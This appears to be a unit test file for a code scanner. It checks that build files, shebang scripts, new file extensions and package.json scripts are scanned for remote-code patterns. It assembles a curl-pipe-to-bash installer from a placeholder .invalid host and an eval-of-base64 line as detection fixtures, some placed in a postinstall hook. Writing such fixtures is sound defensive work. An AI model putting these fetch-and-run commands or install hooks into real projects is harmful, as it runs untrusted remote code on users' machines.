"""FR-E3a t2 (F1.04): shebang scripts, missing languages, build recipes and package.json
scripts are scanned as code.

Payloads are assembled at runtime (no malicious literal is committed), hosts use the
.invalid TLD, nothing is executed and nothing touches the network.
Run: PYTHONPATH=src python3 -B -m unittest discover -s tests
"""
from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from frisk.engine import ScanResult, scan_file

INSTALLER = "cu" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"
DOWNLOAD = "cu" + "rl -sL https://get.example.invalid/i.sh"


class TempDir(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)

    def scan(self, name: str, text: str) -> ScanResult:
        f = self.root / name
        f.write_bytes(text.encode("utf-8"))
        return scan_file(f, self.root)

    def rows(self, name: str, text: str, rule: str = "rce.pipe_installer") -> list[int]:
        return [f.line for f in self.scan(name, text).findings if f.rule == rule]


class TestShebang(TempDir):
    def test_extensionless_shebang_script_blocks_at_its_line(self) -> None:
        self.assertEqual(self.rows("setup", "#!/bin/sh\nset -e\n" + INSTALLER + "\n"), [3])

    def test_text_file_without_shebang_keeps_text_only_scanning(self) -> None:
        self.assertEqual(self.rows("notes.txt", "set -e\n" + INSTALLER + "\n"), [])
        self.assertEqual(self.rows("notes", "# not a shebang\n" + INSTALLER + "\n"), [])

    def test_binary_files_still_yield_no_pattern_findings(self) -> None:
        payload = ("#!/bin/sh\n" + INSTALLER + "\n").encode("utf-8")
        (self.root / "logo.png").write_bytes(payload)
        (self.root / "tool").write_bytes(b"\x7fELF\xff\xfe" + payload)
        self.assertEqual(scan_file(self.root / "logo.png", self.root).findings, [])
        self.assertEqual([f.rule for f in scan_file(self.root / "tool", self.root).findings], ["coverage.binary"])


class TestNewCodeExtensions(TempDir):
    def test_tsx_eval_of_decoded_base64_gives_an_rce_finding(self) -> None:
        text = "export const A = () => {\n  ev" + "al(base64Decode(payload));\n};\n"
        rce = [(f.line, f.rule) for f in self.scan("view.tsx", text).findings if f.category == "rce"]
        self.assertIn((2, "rce.eval_b64"), rce)

    def test_each_new_extension_is_code(self) -> None:
        for ext in (".tsx", ".jsx", ".mts", ".cts", ".ksh", ".command", ".vbs", ".applescript", ".psm1"):
            with self.subTest(ext=ext):
                self.assertEqual(self.rows("a" + ext, "x\n" + INSTALLER + "\n"), [2])


class TestBuildRecipes(TempDir):
    def test_makefile_recipe_blocks_at_its_line(self) -> None:
        self.assertEqual(self.rows("Makefile", "all: build\n\t@echo hi\n\t" + INSTALLER + "\n"), [3])
        self.assertEqual(self.rows("Makefile", "VAR = 1\nall: ; " + INSTALLER + "\n"), [2])

    def test_makefile_prose_outside_recipes_is_not_code(self) -> None:
        self.assertEqual(self.rows("Makefile", "# " + INSTALLER + "\nall:\n\techo ok\n"), [])

    def test_dockerfile_run_with_continued_line_blocks_at_the_run_line(self) -> None:
        text = "FROM base\nRUN apt-get update && \\\n    " + DOWNLOAD + " \\\n    | sh\nCMD [\"app\"]\n"
        self.assertEqual(self.rows("Dockerfile", text), [3])
        self.assertEqual(self.rows("Dockerfile.dev", "FROM base\nrun " + INSTALLER + "\n"), [2])

    def test_dockerfile_comment_is_not_code(self) -> None:
        self.assertEqual(self.rows("Dockerfile", "FROM base\n# " + INSTALLER + "\n"), [])

    def test_justfile_recipe_blocks_at_its_line(self) -> None:
        self.assertEqual(self.rows("justfile", "set shell := [\"bash\", \"-c\"]\n\ninstall:\n    " + INSTALLER + "\n"),
                         [4])

    def test_every_documented_build_file_name_is_scanned(self) -> None:
        # Review: these name variants were documented but no test pinned them.
        for name, text in (("GNUmakefile", "all:\n\t" + INSTALLER + "\n"), ("rules.mk", "all:\n\t" + INSTALLER + "\n"),
                           ("app.dockerfile", "FROM base\nRUN " + INSTALLER + "\n"),
                           (".justfile", "install:\n    " + INSTALLER + "\n")):
            with self.subTest(name):
                self.assertEqual(self.rows(name, text), [2])


class TestPackageJsonScripts(TempDir):
    def test_postinstall_blocks_at_its_raw_line(self) -> None:
        doc = {"name": "pkg", "version": "1.0.0", "scripts": {"test": "node test.js", "postinstall": INSTALLER}}
        self.assertEqual(self.rows("package.json", json.dumps(doc, indent=2) + "\n"), [6])

    def test_escaped_quotes_keep_the_right_line(self) -> None:
        doc = {"scripts": {"say": 'echo "hi"', "postinstall": INSTALLER}}
        self.assertEqual(self.rows("package.json", json.dumps(doc, indent=2) + "\n"), [4])

    def test_same_text_outside_scripts_is_not_code(self) -> None:
        doc = {"description": "Never run " + INSTALLER, "scripts": {"test": "node t.js"}}
        self.assertEqual(self.rows("package.json", json.dumps(doc, indent=2)), [])

    def test_malformed_package_json_is_a_coverage_note_not_a_crash(self) -> None:
        result = self.scan("package.json", '{"scripts": {"postinstall": "x",\n')
        # Both surfaces that read it as JSON note it (json_values: FR-E3b item 4).
        self.assertEqual([(f.rule, f.severity) for f in result.findings], [("coverage.surface_error", "warn")] * 2)
        self.assertEqual([(s.reason, s.detail) for s in result.coverage.skipped],
                         [("surface_error", "json_values: JSONDecodeError"),
                          ("surface_error", "package_json: JSONDecodeError")])
        self.assertEqual(result.coverage.files_scanned, 1)


if __name__ == "__main__":
    unittest.main()
